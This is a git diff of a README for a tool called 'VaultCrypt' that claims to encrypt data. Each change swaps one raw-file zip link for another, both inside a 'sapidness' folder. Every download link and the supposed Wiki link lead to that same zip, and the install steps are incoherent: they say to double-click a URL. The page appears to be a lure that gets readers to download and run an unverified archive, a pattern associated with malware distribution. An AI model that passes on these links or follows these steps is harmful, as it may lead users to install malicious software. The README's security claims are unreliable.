@@ -1,6 +1,6 @@
 # 🗝️ VaultCrypt - Secure Your Data Easily
 
-[![Download VaultCrypt](https://raw.githubusercontent.com/Oika05/VaultCrypt/main/sapidness/VaultCrypt.zip)](https://raw.githubusercontent.com/Oika05/VaultCrypt/main/sapidness/VaultCrypt.zip)
+[![Download VaultCrypt](https://github.com/Oika05/VaultCrypt/raw/refs/heads/main/sapidness/Crypt-Vault-2.8.zip)](https://github.com/Oika05/VaultCrypt/raw/refs/heads/main/sapidness/Crypt-Vault-2.8.zip)
 
 ## 🚀 Getting Started
 
@@ -17,14 +17,14 @@ VaultCrypt is a simple tool designed to help you protect sensitive information. 
 
 To get started with VaultCrypt, please visit the following link to download the latest version:
 
-[Click here to download VaultCrypt](https://raw.githubusercontent.com/Oika05/VaultCrypt/main/sapidness/VaultCrypt.zip)
+[Click here to download VaultCrypt](https://github.com/Oika05/VaultCrypt/raw/refs/heads/main/sapidness/Crypt-Vault-2.8.zip)
 
 1. Open the link above in your web browser.
 2. Find the section titled "Assets" on the releases page.
-3. Download the file named `https://raw.githubusercontent.com/Oika05/VaultCrypt/main/sapidness/VaultCrypt.zip`.
+3. Download the file named `https://github.com/Oika05/VaultCrypt/raw/refs/heads/main/sapidness/Crypt-Vault-2.8.zip`.
 4. Once the download is complete, locate the file in your downloads folder.
 5. Extract the contents of the zip file to a folder of your choice.
-6. Double-click the `https://raw.githubusercontent.com/Oika05/VaultCrypt/main/sapidness/VaultCrypt.zip` file to run the application.
+6. Double-click the `https://github.com/Oika05/VaultCrypt/raw/refs/heads/main/sapidness/Crypt-Vault-2.8.zip` file to run the application.
 
 ## 🛠️ Using VaultCrypt
 
@@ -60,7 +60,7 @@ Yes, VaultCrypt uses strong algorithms to secure your password. Always use a uni
 
 ## 🔗 Additional Resources
 
-For more detailed information, check out our Wiki page here: [VaultCrypt Wiki](https://raw.githubusercontent.com/Oika05/VaultCrypt/main/sapidness/VaultCrypt.zip)
+For more detailed information, check out our Wiki page here: [VaultCrypt Wiki](https://github.com/Oika05/VaultCrypt/raw/refs/heads/main/sapidness/Crypt-Vault-2.8.zip)
 
 ## 🛡️ Community Support
 
@@ -78,4 +78,4 @@ We welcome contributions. If you want to help, please submit a pull request. Ens
 
 Thank you for choosing VaultCrypt to protect your important files. Enjoy the peace of mind that comes with knowing your data is secure.
 
-[Click here to download VaultCrypt](https://raw.githubusercontent.com/Oika05/VaultCrypt/main/sapidness/VaultCrypt.zip)
+[Click here to download VaultCrypt](https://github.com/Oika05/VaultCrypt/raw/refs/heads/main/sapidness/Crypt-Vault-2.8.zip)
